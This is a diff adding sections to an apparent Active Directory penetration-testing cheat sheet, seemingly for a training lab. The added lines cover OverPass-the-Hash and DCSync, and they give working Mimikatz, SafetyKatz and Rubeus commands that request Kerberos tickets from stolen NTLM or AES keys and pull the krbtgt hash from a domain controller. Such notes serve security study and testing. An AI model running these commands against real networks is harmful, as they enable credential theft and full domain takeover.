@@ -148,6 +148,51 @@ Common Enumeration Tools and Techniques: Enumeration can be performed using a va
 Reconnaissance Without Credentials: Even without valid domain credentials, attackers can leverage null sessions, misconfigured services, and network discovery tools to gain valuable information. These findings often serve as a foothold to further access.
 
 
+3 - OverPass-The-Hash (Pass-the-Key)
+
+OverPass-The-Hash (OPTH) that allows attackers to generate authentication tokens from NTLM hashes or Kerberos keys. It needs administrator right using Mimi/Safety-Katz and no elevation using Rubeus.
+
+In the case of Pass-The-Hash it's necessary to read NTLM hash and use it to authenticate 'as a password' using local users credentials (eg. local administrator of machine), while OverPass-The-Hash uses NTLM or AES Key to obtain TGT Kerberos and authenticate on the system using domain users credentials (usually spawning a new powershell session).
+
+
+Invoke-Mimikatz
+
+To perform OPTH with AES256 encryption:
+Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"
+
+SafetyKatz
+
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe"
+
+This starts a PowerShell session with logon type 9 (equivalent to runas /netonly).
+Rubeus (Kerberos-focused Attack)
+
+For OPTH using NTLM hashes (doesn’t require elevation):
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+
+For OPTH with AES256 encryption (requires elevation):
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+
+4 - DCSYNC 
+
+DCSync Attack (Extracting Credentials from the Domain Controller)
+
+DCSync allows an attacker to extract password hashes from a Domain Controller without executing code on it.
+Mimikatz
+
+Extracting the krbtgt Hash
+
+To obtain the krbtgt hash using DCSync (requires Domain Admin privileges):
+Invoke-Mimikatz -Command "lsadump::dcsync /user:us\krbtgt"
+
+SafetyKatz
+
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt"
+
+By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to execute this attack.
+
+
 ### Commands PowerView
 ```
 # Get Domain Information, Retrieves information about the current domain.
